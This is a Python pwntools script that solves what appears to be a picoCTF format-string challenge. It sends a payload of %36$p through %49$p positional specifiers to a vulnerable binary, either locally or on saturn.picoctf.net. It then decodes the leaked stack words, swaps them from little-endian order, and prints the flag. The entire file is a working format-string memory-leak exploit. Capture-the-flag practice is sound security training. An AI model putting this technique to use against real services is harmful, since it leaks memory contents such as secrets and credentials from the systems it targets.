#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './vuln'  # Replace with actual binary name
HOST = 'saturn.picoctf.net'  # Replace with actual host
PORT = 63104  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    #offset is 4
    payload_1 = b""

    for num in range(36, 50):
        payload_1 += f"%{num}$p".encode()

    conn.sendlineafter(b"Tell me a story and then I'll tell you one >> ", payload_1)
    conn.recvuntil(b"Here's a story - \n")
    hex_flag = conn.recv()
    ascii_flag = hex_flag.decode("ascii")
    parts = ascii_flag.split("0x")
    corrected_parts = ""
    for part in parts:

        if part == '':
            continue

        try:
            part = bytes.fromhex(part)
            part = part.decode("ascii")
            swapped_part = part[::-1]
            corrected_parts += swapped_part
        except UnicodeDecodeError:
            print("non-text:", part.hex())
        except ValueError:
            print("non-hexadec num", part)
        
    print(corrected_parts)

def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()